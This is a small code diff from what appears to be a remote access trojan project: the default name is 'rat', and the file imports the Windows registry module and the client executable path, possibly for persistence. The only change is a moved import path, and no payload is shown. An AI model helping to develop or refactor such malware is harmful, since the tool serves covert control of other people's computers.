@@ -25,7 +25,7 @@ SCRIPT_METADATA = {
 
 import winreg
 
-from core.utils.client_util import get_executable_path
+from client.runtime.client_util import get_executable_path
 
 DEFAULT_NAME = 'rat'
 EXECUTABLE_PATH = get_executable_path()
